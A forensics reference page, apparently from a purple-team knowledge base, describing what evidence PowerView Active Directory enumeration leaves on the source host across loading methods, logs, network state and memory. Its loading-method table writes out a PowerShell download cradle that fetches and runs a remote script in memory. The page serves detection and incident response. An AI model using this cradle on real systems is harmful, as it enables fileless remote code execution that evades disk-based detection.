# PowerView — Source Evidence

PowerView's source-host evidence story is fundamentally shaped by **how it was loaded**, because that choice determines whether a script body ever touches disk at all. This is the same PowerShell-logging-subsystem foundation `Purple Teaming/LOLBins/powershell/` already built in depth — this page cites that page's findings rather than re-deriving them and adds only what's specific to PowerView's own artifact shape.

## Contents
- [Loading Method Determines What Survives](#loading-method-determines-what-survives)
- [ConsoleHost_history.txt and Interactive-Session Artifacts](#consolehost_historytxt-and-interactive-session-artifacts)
- [Process Artifacts](#process-artifacts)
- [Local Network-Connection State](#local-network-connection-state)
- [Cached Credential Material](#cached-credential-material)
- [OS-Level Audit Trail](#os-level-audit-trail)
- [Memory-Forensics Angle](#memory-forensics-angle)
- [Timeline Correlation Value](#timeline-correlation-value)

---

## Loading Method Determines What Survives

| Method | Disk footprint | What's recoverable |
|---|---|---|
| `IEX (New-Object Net.WebClient).DownloadString('http://.../powerview.ps1')` | **None** — script text exists only in the PowerShell process's memory | Nothing on disk names the script; recovery depends entirely on PowerShell's own logging (Script Block Logging/4104, if enabled — see `04 - Target Evidence.md`) or live memory acquisition before the process exits |
| `Import-Module .\powerview.ps1` / dot-source (`. .\powerview.ps1`) from a locally-staged copy | A `.ps1` file on disk, however briefly | Standard file-system forensics apply — MFT entry, `$STANDARD_INFORMATION`/`$FILE_NAME` timestamps, MOTW/Zone.Identifier if the file arrived via a browser or an application that sets it (curl/`Invoke-WebRequest`-staged copies frequently do **not** get MOTW — see `LOLBins/powershell/04 - Target Evidence.md`'s finding on this) |
| Reflective load via a C2 framework's built-in PowerShell-execution primitive (Cobalt Strike's `powerpick`/`execute-assembly`-style loaders, Empire's PowerShell agent, Sliver's `execute-assembly`) | None — the framework's own in-memory execution stub runs the script text without ever calling `powershell.exe` as a distinct process at all in some implementations | Recovery depends on the **framework's** own artifact story, not PowerView's — see the relevant framework's own `03`/`04` pages (`Cobalt Strike/`, `PowerShell Empire/`, `Sliver/`) |

The practical implication: **the single most common real-world PowerView invocation (download-cradle-into-memory) leaves no PowerView-specific file on disk at all.** Everything below this point is either process-level evidence (present regardless of loading method) or PowerShell-engine-level evidence (present only if logging was configured — see `04`).

## ConsoleHost_history.txt and Interactive-Session Artifacts

Per `LOLBins/powershell/04 - Target Evidence.md`'s already-verified finding: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` is populated **only for interactive console input**, one line per submitted command, in plaintext. For PowerView specifically, this means:

- If an operator typed `Get-DomainUser -SPN` (or similar) directly at a live PowerShell prompt, that exact line — including any inline `-Credential`/`-Domain` arguments — lands in this file, on the **operator's own attacking host**, not the target.
- If PowerView was instead driven through a C2 agent's scripted task execution (the far more common real-world pattern for anything beyond a quick interactive check), **nothing lands here** — the agent process never has an interactive PSReadLine-backed console session at all.
- Where this file does exist, it is the single richest artifact for reconstructing an operator's *exact* enumeration sequence and targeting choices — order of commands, typos, abandoned/retried queries — none of which survive in any target-side log.

## Process Artifacts

Regardless of loading method, a `powershell.exe`/`pwsh.exe` process (or whatever process hosts the PowerShell engine — a C2 implant's own binary, if reflectively loaded through it) exists on the source host for the duration of the enumeration session:

- **Command line** (if `powershell.exe` was launched directly rather than PowerView being driven through an already-running engine): captured by the source host's own Sysmon 1/Security 4688, same as any other PowerShell invocation — see `LOLBins/powershell/04 - Target Evidence.md`'s full command-line-capture discussion. A `-EncodedCommand` blob containing a Base64-wrapped download cradle is the most common real-world form.
- **Network-connection ownership**: the LDAP/SAMR/Kerberos connections PowerView opens (see `01 - Overview.md`'s protocol table) are all opened *by* this process — `netstat -ano`/EDR process-to-connection mapping on the source host directly ties a specific DC connection back to the specific `powershell.exe`/host-process PID, which is often the fastest way to scope "how long was this session enumerating" when the target-side DC logs nothing useful (see `04 - Target Evidence.md`).
- **Loaded-module list**: `System.DirectoryServices`/`System.DirectoryServices.Protocols` assemblies loading into a `powershell.exe` process that isn't otherwise doing anything AD-related is a mild anomaly signal on the source host, though a legitimate admin running `dsa.msc`-adjacent PowerShell work produces the same signature — low standalone value, useful as corroboration only.

## Local Network-Connection State

- `netstat`/`Get-NetTCPConnection` on the source host, captured live or via a full triage collection, shows outbound connections to the target domain's DC(s) on 389/636/88/445/135 — directly corroborates the scope and duration of a PowerView session even where no command-line or logging evidence survives.
- The **breadth** of DC connections (a single source host talking to every DC in a multi-DC environment in a short window) is itself a mild anomaly worth correlating against normal admin-workstation baseline behavior.

## Cached Credential Material

- If `-Credential`/`Invoke-UserImpersonation` was used with an alternate account, that `PSCredential` object exists in the process's memory for the session's duration — recoverable via live memory analysis of the source-host process (see Memory-Forensics Angle below), but not written to disk by PowerView itself.
- Windows Credential Manager is **not** touched by PowerView's own credential handling — unlike a tool that shells out to `net use` or `runas`, PowerView's Kerberos-impersonation and LDAP-bind-with-alternate-credentials paths stay entirely in-process. An analyst checking `cmdkey /list` on a suspected PowerView source host should not expect to find anything there from PowerView itself.

## OS-Level Audit Trail

- Windows' own audit subsystem on the **source** host has no PowerView-specific signal — the relevant audit categories are the general process-creation (4688) and, if PowerShell-specific logging was enabled, the engine's own event channels documented in full in `LOLBins/powershell/04 - Target Evidence.md` (Event 400/403 classic channel; 4103/4104 Operational channel; the narrow always-on Warning-level 4104 heuristic for suspicious script-block content, which is worth specifically re-checking against PowerView's own source: it defines several classes matching the hardcoded suspicious-strings list — `Add-Type` isn't used by PowerView itself, but any PowerView session that also loads a reflection-based helper alongside it may trip the heuristic incidentally).
- AMSI (see `LOLBins/powershell/04 - Target Evidence.md`'s Endpoint Security Product Behavior section) applies to PowerView's script content exactly as it does to any PowerShell script — a successful AMSI bypass upstream of loading PowerView removes AV/EDR content-inspection visibility into the script, independent of whatever Script Block Logging captures.

## Memory-Forensics Angle

Given how much of a typical PowerView session leaves no disk trail, live memory analysis of the source host is disproportionately valuable here, mirroring `LOLBins/powershell/04 - Target Evidence.md`'s finding for PowerShell generally:

- A `powershell.exe`/host-process holding unbacked, executable memory containing recognizable PowerView function names/strings (`Get-Domain`, `Find-InterestingDomainAcl`, the `Set-Alias` block's legacy-name mappings) is a strong indicator of a reflectively-loaded copy — standard unbacked-region memory forensics applies (`Windows/17 - Memory Forensics/Memory Analysis (Processes, Injection, Rootkits).md`).
- The AMSI scan buffer, per the same cross-linked page, is a documented recovery avenue for script content even where the on-disk/event-log trail is otherwise empty.
- Query-result data (enumerated users/groups/ACLs, still held as live PowerShell objects for the remainder of the session) is itself forensically valuable if captured — it shows exactly what the operator learned, not just what they asked.

## Timeline Correlation Value

Source-side evidence for a PowerView session is strongest as a **process-and-network-window anchor**: `[process creation / Sysmon 1, if the engine was launched directly]` → `[ConsoleHost_history.txt entries, interactive sessions only]` → `[outbound LDAP/SAMR/Kerberos connections to the DC(s), source-host netstat/EDR]`. Because target-side DC logging for a normal LDAP read is close to nonexistent by default (the same problem `AdFind/04 - Target Evidence.md` documents for that tool), this source-side window is frequently the *only* precise timing evidence available for reconstructing when a PowerView-based enumeration pass actually happened — see `04 - Target Evidence.md` and `05 - Detection and Hunting.md`'s Hunting Priority table for how that asymmetry shapes the hunt.
